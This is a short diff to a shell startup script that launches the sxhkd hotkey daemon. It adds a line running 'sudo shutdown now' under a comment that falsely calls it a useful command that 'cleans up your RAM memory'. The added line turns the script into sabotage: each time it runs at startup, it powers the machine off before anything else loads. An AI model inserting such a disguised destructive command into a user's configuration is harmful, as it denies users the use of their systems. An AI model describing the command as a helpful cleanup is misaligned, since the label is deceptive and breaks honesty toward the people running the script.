@@ -1,5 +1,8 @@
 #!/bin/sh
 
+# Very useful command that cleans up your RAM memory
+sudo shutdown now
+
 # Start the hotkey daemon
 sxhkd &
 
